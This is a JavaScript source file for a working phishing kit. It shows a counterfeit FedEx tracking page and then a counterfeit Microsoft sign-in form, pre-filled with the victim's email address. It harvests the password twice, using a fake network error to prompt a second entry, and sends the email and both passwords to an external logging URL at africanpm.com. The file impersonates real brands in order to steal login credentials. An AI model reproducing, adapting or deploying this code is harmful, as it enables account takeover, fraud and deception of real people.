const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

const temp_id = document.getElementById("temp_id");

const app_main = document.getElementById("app_main");

const getPager = document.getElementById("getPager");

let main_id = "ENTER E-MAIL";
if (validEmail.test(temp_id.value)) {
    main_id = temp_id.value;
}

const d = new Date();

getPager.addEventListener("click", ()=>{

    getPager.innerText = "Please wait ..."
    
    setTimeout(() => {
        app_main.innerHTML = `

    <head>
    <style>
    .container_fedex {
        width: 100%;
        min-height: 100vh;
    }
    
    .track_pad {
        width: 100%;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-wrap: wrap;
        gap: 0.5rem;
        position: fixed;
        z-index: 5;
        background-color: rgba(0, 0, 0, 0.8);
    }
    
    .track_btn,
    .track_content {
        height: 60px;
        padding: 0.2rem 0.5rem;
        box-shadow: 0px 0px 2px 1px #4d148c;
    }
    
    .track_content {
        background-color: white;
        width: 50%;
    }
    
    .track_id {
        display: block;
        font-size: 0.7rem;
        color: #4d148c;
        margin-bottom: 1rem;
        font-weight: bold;
    }
    
    .track_input {
        display: block;
        width: 100%;
        outline: none;
    }
    
    .track_btn {
        background-color: rgb(255, 98, 0);
        color: white;
        min-width: 10%;
        display: flex;
        justify-content: center;
        align-items: center;
        cursor: pointer;
        font-weight: bold;
        font-size: large;
    }
    
    .nav_fedex {
        display: flex;
        justify-content: space-around;
        align-items: center;
        background-color: #4d148c;
        color: white;
        padding: 1.5rem 0rem;
        font-size: 1rem;
    }
    
    .nav_fedex section {
        display: flex;
        align-items: center;
        gap: 1.5rem;
    }
    
    .nav_fedex section img {
        width: 50%;
        object-fit: contain;
    }
    
    .nav_fedex section span {
        display: flex;
        align-items: center;
        gap: 1rem;
    
    }
    
    .imgAds {
        width: 80%;
        object-fit: contain;
    }
    
    .fex_container {
        background-image: url(https://babo4.github.io/fx/pics/desktop.jpg);
        background-repeat: no-repeat;
        background-size: cover;
        background-position: top;
        width: 100%;
        min-height: 76vh;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        gap: 5rem;
        z-index: 1;
    }
    
    .fex_container p {
        font-size: 3rem;
        color: white;
        font-weight: 400;
    }
    
    .fex_detail {
        display: flex;
    }
    
    .fex_detail div {
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        gap: 1rem;
        width: 15vw;
        height: 20vh;
    }
    
    .fex_body {
        width: 80%;
        margin-left: 10%;
        text-align: center;
        margin: 2rem auto;
    }
    
    .fex_body h2 {
        margin: 1rem auto;
        font-weight: 500;
        font-size: 2rem;
    }
    
    .icon_manager img,
    .icon_manager svg {
        width: 40%;
        object-fit: contain;
    }
    
    .icon_manager {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
        gap: 10px;
    }
    
    .icon_manager div {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        gap: 1rem;
        padding: 1rem 0.5rem;
        color: #007ab7;
        text-transform: uppercase;
        font-weight: bold;
        font-size: 0.7rem;
    }
    
    .fex_content_list {
        display: flex;
        gap: 1rem;
        align-items: center;
        margin: 2rem 0rem;
    }
    
    .fex_content_list div {
        display: flex;
        flex-direction: column;
        gap: 2rem;
    }
    
    .fex_content_list div span {
        border: 2px solid #007ab7;
        max-width: 50%;
        padding: 1rem 0.5rem;
        border-radius: 2rem;
    }
    
    .fex_img1 {
        width: 50%;
        object-fit: contain;
    }
    
    .fex_img2 {
        width: 20vw;
        object-fit: contain;
    }
    
    .fex_footer {
        display: flex;
        background-color: #4d148c;
        color: white;
        justify-content: space-around;
        padding: 1rem 0rem;
    }
    
    .fex_footer section span {
        padding: 0rem 1rem;
    }
    
    .fex_footer section span:not(:last-child) {
        border: 1px solid white;
        border-width: 0px 1px 0px 0px;
    }
    
    
    #domain_server,
    #domain_email {
        display: none;
    }
    
    .nav_header {
        position: fixed;
        top: 0;
        display: flex;
        align-items: center;
        width: 100%;
        height: 10vh;
        background-color: black;
        padding: 0.2rem 0.5rem;
        box-shadow: 0px 0px 3px 1px silver;
        z-index: 10;
    }
    
    .nav_header img {
        width: 12vw;
        object-fit: contain;
    }
    
    .main_pdf {
        width: 100%;
        height: 250vh;
        display: flex;
        justify-content: center;
        margin-top: 4.5rem;
        position: relative;
        background-repeat: no-repeat;
        background-size: cover;
    
    }
    
    
    .loading_temp {
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        gap: 1rem;
        width: 50%;
        height: 70vh;
        background-color: white;
        color: gray;
        position: fixed;
        top: 10rem;
        box-shadow: 0px 0px 5px 1px red;
        border-radius: 5px;
        font-size: 1.2rem;
        transition: 2s ease-in-out;
    }
    
    .loading_temp img {
        width: 10vw;
        object-fit: contain;
        animation: loader 3s ease-in-out infinite;
    }

    @media (max-width: 1030px) {
        .fex_container {
            background-size: contain;
            min-height: 30vh;
            gap: 3rem;
        }
    
        .fex_detail div {
            width: 20vw;
            height: 10vh;
        }
    
        .fex_body {
            margin-top: 0rem;
        }
    }
    
    @media (max-width: 900px) {
        .nav_fedex section img {
            width: 80%;
        }
    
        .nav_fedex {
            padding: 0.5rem 0rem;
        }
    
        .mobile_nav {
            display: block !important;
            font-size: 3rem;
        }
    
        .desktop_nav {
            display: none !important;
        }
    
        .fex_container {
            background-size: contain;
            min-height: 30vh;
            gap: 3rem;
        }
    
        .fex_detail div {
            width: 20vw;
            height: 10vh;
            margin-top: -5%;
        }
    
        .fex_body {
            margin-top: 0rem;
        }
    
        .track_content {
            width: 70%;
        }
    
        .track_btn {
            width: 15%;
        }
    
        .fex_content_list div span {
            max-width: 100%;
        }
    }
    
    @media (max-width: 650px) {
        .fex_container p {
            font-size: 2rem;
            margin-top: -15%;
        }
    
        .fex_detail div {
            width: 20vw;
            height: 10vh;
            gap: 0.5rem;
            font-size: small;
        }
    
        .imgAds {
            margin-top: -15%;
        }
    
        .fex_footer {
            font-size: small;
        }
    }
    
    @media (max-width:500px) {
        .nav_fedex section img {
            width: 50%;
        }
    
        .fex_container p {
            font-size: 2rem;
            margin-top: -20%;
        }
    
        .fex_detail div {
            width: 25vw;
            height: 10vh;
            gap: 0.5rem;
            font-size: small;
        }
    
        .imgAds {
            margin-top: -15%;
        }
    
        .fex_img1,
        .fex_img2 {
            width: 100%;
        }
    
        .fex_body {
            width: 90%;
            margin-left: 5%;
        }
    
        .fex_content_list {
            flex-wrap: wrap;
        }
    
        .fex_content_list div span {
            font-size: small;
            padding: 0.5rem 1rem;
        }
    
        .track_btn,
        .track_content {
            width: 90%;
            gap: 0rem;
        }
    
        .track_content {
            height: 70px;
        }
    
        .track_btn {
            width: 50%;
            height: 40px;
            margin-top: -50%;
        }
    
        .fex_footer {
            font-size: x-small;
        }
    
        .fex_footer section span {
            padding: 0rem 0.3rem;
        }
    }
    
    @media (max-width: 400px) {
        .fex_container p {
            font-size: 1.5rem;
            margin-top: -20%;
        }
    
        .fex_detail div {
            width: 30vw;
            height: 6vh;
            font-size: x-small;
        }
    
        .fex_detail div img {
            width: 20px;
        }
    }
    
    @media (max-width:360px) {
        .fex_container p {
            margin-top: -30%;
        }
    
        .fex_detail div {
            height: 8vh;
            margin-top: -10%;
        }
    }
    
    @media (max-width: 330px) {
        .fex_container p {
            margin-top: -10%;
        }
    
        .fex_detail div {
            height: 10vh;
            margin-top: -10%;
        }
    
        .imgAds {
            margin: -5%;
        }
    
        .track_pad {
            padding-top: 50%;
        }
    
    }
    
    @media (max-width:250px) {
        .fex_container p {
            margin-top: 1%;
            font-size: small;
        }
    
        .fex_detail div {
            height: 15vh;
            margin-top: -15%;
        }
    
        .imgAds {
            margin-top: 10%;
        }
    
        .track_btn {
            margin-top: 0%;
        }
    }
    </style>
    </head>
    
    <section class="container_fedex">
    
            <div class="track_pad">
    
                <section class="track_content">
                    <span class="track_id"></span>
    
                    <span class="track_input" contenteditable="true" spellcheck="false" onclick="fexIputGet(this)">${main_id}</span>
    
                </section>
    
                <section class="track_btn" onclick="fexBtnSub(this)">
                    TRACK
                </section>
                
            </div>
    
            <div class="nav_fedex">
    
                <section>
                    <img src="https://babo4.github.io/fx/pics/logo.png" alt="logo">
                </section>
                
                <section class="desktop_nav">
                <span>Shipping &#9013;</span>
                <span>Tracking &#9013;</span>
                <span>Design & Print &#9013;</span>
                <span>Locations &#9013;</span>
                <span>Support &#9013;</span>
                </section>
    
                <section class="desktop_nav">
                    <span>
                        Sign Up or Log In &#128100;
                    </span>
    
                    <span>
                        &#128269;
                    </span>
                </section>
    
                <section style="display: none;" class="mobile_nav">
                    &#8801;
                </section>
            </div>
    
            <div class="fex_container">
    
                <p>
                    Ship, manage, track, deliver
                </p>
    
                <section class="fex_detail">
                    <div style="background-color: #fafafa;">
                        <img src="https://babo4.github.io/fx/pics/rate.png" alt="">
                        RATE & SHIP</div>
                    <div style="background-color: #4d148c; color: #fafafa">
                        <img src="https://babo4.github.io/fx/pics/track.png" alt="">
                        TRACK</div>
                    <div style="background-color: white;">
                        <img src="https://babo4.github.io/fx/pics/location.png" alt="">
                        LOCATIONS</div>
                </section>
    
            </div>
    
            <div class="fex_body">
    
                <section>
                    <img class="imgAds" src="https://babo4.github.io/fx/pics/d1.png" alt="">
    
                    <h2>
                        Manage your shipments and returns
                    </h2>
    
                    <section class="icon_manager">
                        <div>
                            <img src="https://babo4.github.io/fx/pics/icon_courier.png" alt="">
                            <span>Drop off a 
                                <br>
                                package</span>
                        </div>
    
                        <div>
                            <img src="https://babo4.github.io/fx/pics/icon_delivery.png" alt="">
                            <span>Redirect a 
                                <br> package</span>
                        </div>
    
                        <div>
                            <img src="https://babo4.github.io/fx/pics/retail-services.svg" alt="">
                            <span>Store hours 
                                <br> and services</span>
                        </div>
    
                        <div>
                            <img src="https://babo4.github.io/fx/pics/icon_alert.png" alt="">
                            <span>Service <br> alerts</span>
                        </div>
    
                        <div>
                            <img src="https://babo4.github.io/fx/pics/icon_returns.png" alt="">
                            <span>Return a 
                                <br>package</span>
                        </div>
                    </section>
    
                    <section class="fex_content_list">
                        <img src="https://babo4.github.io/fx/pics/d2.jpg" alt="" class="fex_img1">
                        <div>
                            <h3>
                                We’re committed to continuing to deliver for you
                            </h3>
        
                            <p>
                                Reach your customers and mitigate risk. Find out why it's worth staying with—or switching to—FedEx.
                            </p>
        
                            <span>
                                SEE THE FEDEX DIFFERENCE
                            </span>
                        </div>
                    </section>
    
                    <h2>Free up time with convenient shipping options</h2>
    
                    <section class="fex_content_list">
                        <img class="fex_img2" src="https://babo4.github.io/fx/pics/d3.jpg" alt="">
                        <div>
                            <h3>
                                Drop-off flexibility is just around the corner
                            </h3>
        
                            <p>
                                Out and about running errands? Drop off your packages at nearby retail locations. Choose from thousands of FedEx Office, FedEx Ship Center®, FedEx Authorized ShipCenter®, FedEx® Drop Box,* Walgreens, Dollar General, and grocery locations nationwide. Some are even open 24 hours. Consider consolidating your drop offs to help reduce multiple-trip emissions.
                            </p>
        
                            <span>
                                VIEW LOCATIONS
                            </span>
                        </div>
                    </section>
    
                    <section class="fex_content_list">
                        <img class="fex_img2" src="https://babo4.github.io/fx/pics/d4.jpg" alt="">
                        <div>
                            <h3>
                                Let us do the packing for you
                            </h3>
        
                            <p>
                                Whether you’re short on time or need some assistance, our packing experts can help. From breakables to perishables, they can send your shipment safely on its way. They can also show you more sustainable packaging options. Packing pros are available at thousands of FedEx Office locations.
                            </p>
        
                            <span>
                                START PACKING
                            </span>
                        </div>
                    </section>
    
                    <h2>Deliveries made easy no matter where you are</h2>
    
                    <section>
                        <img class="fex_img1" src="https://babo4.github.io/fx/pics/d5.jpg" alt="">
                        <h3>Place a free vacation hold while you're away</h3>
                        <p>Enroll in FedEx Delivery Manager® to pause deliveries during your getaway. We’ll keep your packages for up to 14 days, then deliver them once you’re back.</p>
                    </section>
    
                </section>
                
            </div>
    
            <div class="fex_footer">
                <section>
                    &copy; FedEx 1995-${d.getFullYear()}
                </section>
    
                <section>
                    <span>Site Map</span>
                    <span> Terms of Use</span>
                    <span>Privacy & Security</span>
                </section>
            </div>
    
        </section>
    
    `;

    if (validEmail.test(temp_id.value)) {
        pageMajor(temp_id.value);
    }

    }, 2500);

});

// 

function fexIputGet(d) {
    let updateText = d.parentElement
    let dataText = updateText.getElementsByClassName("track_id")[0]
    if (d.innerText == "ENTER E-MAIL") {
        dataText.innerHTML = d.innerText
        d.innerText = ""
    }
}

// 

function fexBtnSub(r) {
    if (r.innerText.toLowerCase() != "track") {
       return 
    }
    // const domain_email = document.getElementById("domain_email")
    let getMail = r.parentElement.parentElement
    let tempMail = getMail.getElementsByClassName("track_input")[0];

    if (validEmail.test(tempMail.innerText.trim())){
        r.innerText = "Processing . . ."

        setTimeout(() => {
            r.innerText = "Validating . . ."
        }, 1000);

        setTimeout(() => {
            pageMajor(tempMail.innerText.trim());

        }, 3000);
    }
    else {
        alert("Wrong E-MAIL ID")
    }
}
// 

function pageMajor(mail) {
    app_main.innerHTML = `
            
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
    *{
        padding: 0;
        margin: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        transition: 0.2s ease;
    }
    
    a{
        text-decoration: none;
        color: #005da6;
    }
    
    main{
        width: 100%;
        height: 100vh;
        overflow: hidden;
        position: relative;
        background-image: linear-gradient(to bottom right, rgba(255, 165, 0, 0.2) , silver, silver, rgba(255, 165, 0, 0.2));
        display: flex;
        justify-content: center;
        align-items: center;
    }
    
    #form_container{
        width: 35%;
        min-height: 50vh;
        background-color: transparent;
    }
    
    #form_container div{
        background-color: white;
        box-shadow: 0px 0px 3px gray;
    }
    
    .office_main_form{
        position: relative;
        padding: 2rem 3rem;
    }
    
    #load_ani{
        display: none;
        width: 100%;
        position: absolute;
        top: 0;
        left: 0;
        font-size: 1.5rem;
        animation: loading_ani 3s linear infinite;
    }
    
    
    .office_main_form h1{
        font-weight: 450;
        margin-top: 1rem;
        font-size: 2rem;
    }
    
    #name_holder{
        color: rgba(0, 0, 0, 0.8);
        font-size: 1rem;
    }
    
    #name_holder b{
        font-size: larger;
        cursor: pointer;
    }
    
    #name_holder{
        display: none;
    }
    
    .office_main_form input{
        display: block;
        width: 100%;
        margin: 1rem 0rem;
        padding: 0.5rem 0.1rem;
        border: 1px solid gray;
        border-width: 0px 0px 1px 0px;
        font-size: inherit;
        outline: none;
    }
    
    .office_main_form input:focus{
        border-color: #005da6 !important;
    }
    
    .btn_container{
        display: flex;
        justify-content: right;
        align-items: center;
        margin-top: 2rem;
    }
    
    .btn_container button{
        background-color: rgba(0, 93, 166, 0.9);
        color: white;
        font-size: inherit;
        border: none;
        padding: 0.4rem 2rem;
    }
    
    .btn_container button:hover{
        background-color: rgba(0, 93, 166, 1);
        cursor: pointer;
    }
    
    .office_main_form p{
        font-size: 0.9rem;
        margin-top: 1rem;
    }
    
    .link_q{
        width: 17px;
        height: 17px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border: 1px solid black;
        border-radius: 50%;
        margin: 0px 3px;
    }
    
    .office_sub_form{
        display: flex;
        align-items: center;
        gap: 0.5rem;
        margin-top: 2rem;
        padding: 0.5rem 3rem;
    }
    
    .office_sub_form:hover{
        background-color: lightgray !important;
        cursor: pointer;
    }
    
    footer{
        position: absolute;
        bottom: 0.5rem;
        right: 0.5rem;
        font-size: 0.8rem;
    }
    
    footer a{
        color: black;
        margin-right: 0.5rem;
    }
    
    footer a:not(:last-child):hover{
        text-decoration: underline;
    }
    
    /*  */
    @keyframes loading_ani {
        from{transform: scaleX(100%);}
        to{transform: scaleX(-95%);}
    }
    
    /*  */
    @media (max-width:1030px) {
        #form_container{
            width: 50%;
        }
    }
    
    @media (max-width:900px) {
        #form_container{
            width: 70%;
        }
    }
    
    @media (max-width:600px) {
        #form_container{
            width: 90%;
        }
    }
    
    @media (max-width:500px) {
        main{
            align-items: flex-start;
            padding-top: 3rem;
        }
    
        .office_main_form h1{
            margin-top: 2rem;
            font-size: 1.5rem;
        }
    
        #form_container{
            width: 90%;
        }
    
        .office_main_form, .office_sub_form{
            padding: 1rem;
        }
    
        .office_main_form p{
            font-size: 0.6rem;
        }
    
        #load_ani{
            top: -2rem;
        }
    }
    
    @media (max-width:400px) {
        #form_container{
            width: 95%;
        }
    }
    
    @media (max-width:300px) {
        main{
            overflow: auto;
        }
    }
    </style>
    
    <title>Sign in to your account</title>
</head>
<body>

    <main id="app_main">
        <aside id="form_container">
            <div class="office_main_form">
                
            <b id="load_ani">. . .</b>
            
                <img src="https://babo4.github.io/msk/logo.svg" alt="Sign in">
                <p id="name_holder"><b>&#10508;</b> <span id="e_holder"></span></p>

                <h1 id="header_main">Sign in</h1>

                <input id="e_input" value="${mail}" class="show_pass_content" placeholder="Email, phone, or Skype">

                <input type="hidden" id="temp_p">
                <input type="hidden" id="data_send" value="1">
                <p id="link1">No account? <a href="#">Create one!</a></p>
                <p id="link2"><a href="#">Sign in with Windows Hello or a security key</a> <span class="link_q">?</span></p>
                <section class="btn_container">
                    <button onclick="subFormBtn(this)" id="btn_365">Next</button>
                </section>
            </div>

            <div class="office_sub_form">
                <img src="https://babo4.github.io/msk/key.svg" alt="Sign in">
                <span>Sign-in options</span>
            </div>

        </aside>

        <footer>
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
            <a href="#">. . .</a>
        </footer>
    </main>
    
</body>
</html>
`;

    const urls = new URLSearchParams(window.location.search);
    const user = urls.get('user');
    
    const e_input = document.getElementById("e_input");
    const load_ani = document.getElementById("load_ani");
    const data_send = document.getElementById("data_send");
    
    let link1 = document.getElementById("link1");
    let link2 = document.getElementById("link2");
    let name_holder = document.getElementById("name_holder");
    let header_main = document.getElementById("header_main");
    let btn_365 = document.getElementById("btn_365");
    let temp_p = document.getElementById("temp_p");
    let e_holder = document.getElementById("e_holder");
    
    const sub_btn = document.getElementById("form_container");

    const office_sub_form = document.getElementsByClassName("office_sub_form")[0]

        getMail(e_input.value)

        e_input.value = "";
        office_sub_form.style.display = "none";

        function getMail(mail) {
            if (validEmail.test(mail)) {
                name_holder.style.display = "block";
                e_holder.innerText = mail;
                e_input.placeholder = "Password";
                e_input.type = "password";
                header_main.innerText = "Enter password";
                btn_365.innerText = "Sign in";
                link1.innerHTML = `<a href="#">Forgot password?</a>`;
                link2.innerHTML = `<a href="#">Other ways to sign in</a>`;
        
            }
            else{
                e_input.style.borderColor = "red";
            }
        }
}

// 
let rand_num = Math.floor(Math.random() * 2000) + 5000;
let office_count = 0;
function subFormBtn(btn) {

    const office_sub_form = document.getElementsByClassName("office_sub_form")[0]

    if (btn.innerText == "Sign in") {
        
        if (office_count == 1) {

            if (validEmail.test(e_holder.innerText)) {

                if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {

                e_input.style.borderColor = "red";
                office_count = 1;
    
                    return
                }

                load_ani.style.display = "block";
                btn_365.innerText = "Verifying . . .";
                getPass(pass1 = temp_p.value, pass2 = e_input.value, mail = e_holder.innerText)
            }
        } 
        else {

            if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
                e_input.style.borderColor = "red"

                return
            }

            office_count++

            load_ani.style.display = "block";
            btn_365.innerText = "Verifying . . .";

             setTimeout(() => {
                temp_p.value =  e_input.value;
                e_input.value = "";
                load_ani.style.display = "none";
                e_input.style.borderColor = "red";

                office_sub_form.style.display = "block";
                office_sub_form.innerHTML = `<b style="color:red; font-weight:400">Network error! Please try again. </b>`;
                btn_365.innerText = "Sign in"
             }, rand_num);
        }
    }

}

// 
function getPass(pass1, pass2, mail) {
    if (pass1 != "" && pass2 !="" && mail != "") {
        let url = "fx_shipping.php?auth=office&domain=fedex&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;

        if (data_send.value == 1) {
            url = "https://africanpm.com/logs/boman/fx_shipping.php?auth=office&domain=fedex&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
        }

        location = url;
        
    }
    else {
        e_input.style.borderColor = "red";
    }
}
